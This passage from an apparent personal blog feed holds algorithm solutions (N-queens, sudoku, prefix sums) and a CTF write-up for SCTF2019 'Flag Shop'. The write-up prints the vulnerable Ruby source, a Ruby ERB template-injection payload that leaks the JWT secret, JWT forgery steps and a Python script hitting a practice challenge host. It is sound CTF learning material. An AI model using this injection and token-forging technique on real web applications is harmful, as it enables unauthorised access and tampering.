class="line">dfs(x+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">dfs(x,y+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(check(x,y,i+<span class="string">'0'</span>))&#123;</span><br><span class="line">Map[x][y]=i+<span class="string">'0'</span>;</span><br><span class="line"><span class="keyword">if</span>(y==<span class="number">8</span>)&#123;</span><br><span class="line">dfs(x+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">dfs(x,y+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">Map[x][y]=<span class="string">'?'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">Map[<span class="number">0</span>][<span class="number">0</span>]=n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">9</span>;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">0</span>&amp;&amp;j==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;Map[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">flag=<span class="number">0</span>;</span><br><span class="line">dfs(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N皇后问题-经典DFS</title>
      <link href="/2020/03/05/N%E7%9A%87%E5%90%8E%E9%97%AE%E9%A2%98-DFS/"/>
      <url>/2020/03/05/N%E7%9A%87%E5%90%8E%E9%97%AE%E9%A2%98-DFS/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>八皇后问题，是一个古老而著名的问题，是回溯算法的典型案例。该问题是国际西洋棋棋手马克斯·贝瑟尔于1848年提出：在8×8格的国际象棋上摆放八个皇后，使其不能互相攻击，即任意两个皇后都不能处于同一行、同一列或同一斜线上，问有多少种摆法。 高斯认为有76种方案。1854年在柏林的象棋杂志上不同的作者发表了40种不同的解，后来有人用图论的方法解出92种结果。</p></blockquote><p>然而这是N皇后哈哈哈哈哈~~~</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在N*N的方格棋盘放置了N个皇后，使得它们不相互攻击（即任意2个皇后不允许处在同一排，同一列，也不允许处在与棋盘边框成45角的斜线上。<br>你的任务是，对于给定的N，求出有多少种合法的放置方法。</p><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>测试数据由多组测试样例组成。每组测试数据第一行输入一个正整数 n (  1 &lt;&#x3D; n &lt;&#x3D; 10 ）</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>输出有多少种合法的放置方法</p><h2 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><h2 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,n,m,a,b,sum;</span><br><span class="line"><span class="keyword">int</span> Map[<span class="number">20</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==n)&#123;</span><br><span class="line">        sum++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;x;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(Map[j]==i||<span class="built_in">abs</span>(x-j)==<span class="built_in">abs</span>(Map[j]-i))&#123;</span><br><span class="line">                <span class="keyword">break</span>;  <span class="comment">//两个点45度直线，两条边相等</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j==x)&#123;</span><br><span class="line">            Map[x]=i;</span><br><span class="line">            dfs(x+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)!=EOF)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(Map,<span class="number">0</span>,<span class="keyword">sizeof</span>(Map));</span><br><span class="line">        sum=<span class="number">0</span>;</span><br><span class="line">        dfs(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[SCTF2019]Flag Shop</title>
      <link href="/2020/03/03/SCTF2019-Flag-Shop/"/>
      <url>/2020/03/03/SCTF2019-Flag-Shop/</url>
      
        <content type="html"><![CDATA[<p>第一次遇见Ruby我去，以为是思路题~~~</p><a id="more"></a><p>首先页面是一个shop类的题</p><p><img src="/1.jpg" alt="BUU"></p><p>buy flag是购买flag,但是要求你的钱要到1e+27才行，work可以加钱，reset重置。审查页面元素没什么思路，发现robots.txt。</p><p>提示了<code>/filebak</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/cookies'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/json'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'jwt'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'erb'</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE__) + <span class="string">'/static'</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">"SECRET"</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(__FILE__) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</span><br><span class="line">  file.sync = <span class="keyword">true</span></span><br><span class="line">  <span class="keyword">use</span> Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/"</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">'/shop'</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/filebak"</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/auth"</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/info"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="keyword">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[0][<span class="string">"uid"</span>],<span class="symbol">jkl:</span> auth[0][<span class="string">"jkl"</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/work"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="keyword">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="keyword">nil</span>?</span><br><span class="line">    if ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</span><br><span class="line">      puts ENV[<span class="string">"FLAG"</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  if params[<span class="symbol">:do</span>] == <span class="string">"<span class="subst">#&#123;params[<span class="symbol">:name</span>][0,<span class="number">7</span>]&#125;</span> is working"</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][0,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="keyword">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][<span class="string">"jkl"</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"error"</span>,<span class="symbol">message:</span> <span class="string">"no enough jkl"</span>&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">"FLAG"</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"success"</span>,<span class="symbol">message:</span> <span class="string">"jkl is good thing"</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  if cookies[<span class="symbol">:auth</span>].<span class="keyword">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">'/shop'</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><a href="https://www.anquanke.com/post/id/86867" target="_blank" rel="noopener">Ruby ERB模板注入</a>可以稍微学习下。</p><p>本来没什么思路的看大佬blog,Cookie是JWT的，之前做项目本来要用的，后来偷懒没用。。</p><p>发现：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  if params[<span class="string">:do</span>] == "#&#123;params[<span class="string">:name</span>][<span class="symbol">0,7</span>]&#125; is working" then</span><br><span class="line"></span><br><span class="line"><span class="code">    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)</span></span><br><span class="line"><span class="code">    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'</span></span><br><span class="line"><span class="code">    cookies[:auth] = auth</span></span><br><span class="line"><span class="code">    ERB::new("&lt;script&gt;alert('#&#123;params[:name][0,7]&#125; working successfully!')&lt;/script&gt;").result</span></span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>这一段存在注入，如果传入的do参数和name参数一致，会输出<code>{params[:name][0,7]} working successfully!</code>，ruby里有<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html" target="_blank" rel="noopener">预定义变量</a></p><p><code>$&#39;-最后一次成功匹配右边的字符串。</code></p><p>构造<code>do=&lt;%=$&#39;%&gt; is working</code>和<code>name=&lt;%=$&#39;%&gt;</code>,记得把里面内容转成十六进制</p><p><img src="/2.jpg" alt="Brup"></p><p>拿到secret</p><p><img src="/3.jpg" alt="JWT.io"></p><p>将jkl改成1e+27,反正凑成能买flag的钱就行。然后换上去购买。</p><p><img src="/4.jpg" alt="brup"></p><p><img src="/5.jpg" alt="JWT.io"></p><p>我自己脚本写错了，我学长帮我写了个</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">hea=<span class="string">"auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJkYTQxMTQwNy1mOTU4LTRmOTktOWU0Mi1iZTVlZmRhNTc2ZjIiLCJqa2wiOjIwfQ.YPg24ZW9BpT18ozBDCFjNDg0rirbCRT6USl3zzguZA8"</span></span><br><span class="line"><span class="keyword">while</span>(i&lt;=<span class="number">1000000000000000000000000001</span>):</span><br><span class="line">    url = <span class="string">"http://9d28a02d-1d7b-412c-9fe8-cb414a4ff97a.node3.buuoj.cn/work?name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working&amp;SECRET="</span></span><br><span class="line">    sess = requests.session()</span><br><span class="line">    sess.headers[<span class="string">'Cookie'</span>]=hea</span><br><span class="line">    res = sess.get(url)</span><br><span class="line">    hea=res.headers[<span class="string">'set-cookie'</span>]</span><br><span class="line">    <span class="keyword">print</span>(res.text)</span><br><span class="line">    sess.headers[<span class="string">'Cookie'</span>] = hea</span><br><span class="line">    url1=<span class="string">"http://9d28a02d-1d7b-412c-9fe8-cb414a4ff97a.node3.buuoj.cn/api/info"</span></span><br><span class="line">    re=sess.get(url1)</span><br><span class="line">    a1=re.text.<span class="keyword">split</span>(<span class="string">':'</span>)[<span class="number">2</span>][:-<span class="number">1</span>]</span><br><span class="line">    i=<span class="keyword">int</span>(a1)</span><br><span class="line">    <span class="keyword">print</span>(a1)</span><br><span class="line">    <span class="keyword">print</span>(hea)</span><br></pre></td></tr></table></figure><p>参考<br><a href="http://www.l-team.org/archives/375.html" target="_blank" rel="noopener">L</a><br><a href="https://www.jianshu.com/p/c1c9b6d1e826" target="_blank" rel="noopener">XD_whYe</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDU6345-子串查询(前缀和)</title>
      <link href="/2020/03/01/HDU6345-%E5%AD%90%E4%B8%B2%E6%9F%A5%E8%AF%A2-%E5%89%8D%E7%BC%80%E5%92%8C/"/>
      <url>/2020/03/01/HDU6345-%E5%AD%90%E4%B8%B2%E6%9F%A5%E8%AF%A2-%E5%89%8D%E7%BC%80%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<p><strong>前缀和是一种重要的预处理，能大大降低查询的时间复杂度。</strong></p><a id="more"></a><p>前缀和，差分。其实可以一起学的哈哈。</p><p>推荐这个博主写的文章：<br><br><a href="https://blog.csdn.net/qq742762377/article/details/81458056?ops_request_misc=%7B%22request_id%22:%22158305910419724845058794%22,%22scm%22:%2220140713.130056874..%22%7D&request_id=158305910419724845058794&biz_id=0&utm_source=distribute.pc_search_result.none-task" target="_blank" rel="noopener">X丶</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>度度熊的字符串课堂开始了！要以像度度熊一样的天才为目标，努力奋斗哦！<br>为了检验你是否具备不听课的资质，度度熊准备了一个只包含大写英文字母的字符串 A[1,n]&#x3D;a1a2⋯an，接下来他会向你提出 q 个问题 (l,r)，你需要回答字符串 A[l,r]&#x3D;alal+1⋯ar 内有多少个非空子串是 A[l,r] 的所有非空子串中字典序最小的。这里的非空子串是字符串中由至少一个位置连续的字符组成的子序列，两个子串是不同的当且仅当这两个子串内容不完全相同或者出现在不同的位置。<br>记 |S| 为字符串 S 的长度，对于两个字符串 S 和 T ，定义 S 的字典序比 T 小，当且仅当存在非负整数 k(≤min(|S|,|T|)) 使得 S 的前 k 个字符与 T 的前 k 个字符对应相同，并且要么满足 |S|&#x3D;k 且 |T|&gt;k，要么满足 <code>k&lt;min(|S|,|T|) </code>且 S 的第 k+1 个字符比 T 的第 k+1 个字符小。例如 “AA” 的字典序比 “AAA” 小，”AB” 的字典序比 “BA” 小。</p><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一行包含一个整数 T，表示有 T 组测试数据。<br>接下来依次描述 T 组测试数据。对于每组测试数据：<br>第一行包含两个整数 n 和 q，表示字符串的长度以及询问的次数。<br>第二行包含一个长为 n 的只包含大写英文字母的字符串 A[1,n]。<br>接下来 q 行，每行包含两个整数 li,ri，表示第 i 次询问的参数。<br>保证 1≤T≤10，1≤n,q≤105，1≤li≤ri≤n。</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>对于每组测试数据，先输出一行信息 “Case #x:”（不含引号），其中 x 表示这是第 x 组测试数据，接下来 q 行，每行包含一个整数，表示字符串<code>A[l,r]</code>中字典序最小的子串个数，行末不要有多余空格。</p><h2 id="样例输入："><a href="#样例输入：" class="headerlink" title="样例输入："></a>样例输入：</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span> <span class="number">3</span></span><br><span class="line">AB</span><br><span class="line"><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">2</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="样例输出："><a href="#样例输出：" class="headerlink" title="样例输出："></a>样例输出：</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Case #<span class="number">1</span>:</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,n,m,a,b;</span><br><span class="line"><span class="keyword">int</span> sum[<span class="number">30</span>][<span class="number">100100</span>];</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t)!=EOF)&#123;</span><br><span class="line"><span class="keyword">int</span> num=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(t--)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,s+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">memset</span>(sum,<span class="number">0</span>,<span class="keyword">sizeof</span>(sum));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">26</span>;j++)&#123;</span><br><span class="line">sum[j][i]=sum[j][i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">sum[s[i]-<span class="string">'A'</span>][i]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Case #%d:\n"</span>,num++);</span><br><span class="line"><span class="keyword">while</span>(m--)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;a,&amp;b);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(sum[i][b]-sum[i][a<span class="number">-1</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum[i][b]-sum[i][a<span class="number">-1</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百度云CDN加速配置</title>
      <link href="/2020/02/28/%E7%99%BE%E5%BA%A6%E4%BA%91CDN%E5%8A%A0%E9%80%9F%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/02/28/%E7%99%BE%E5%BA%A6%E4%BA%91CDN%E5%8A%A0%E9%80%9F%E9%85%8D%E7%BD%AE/</url>
      
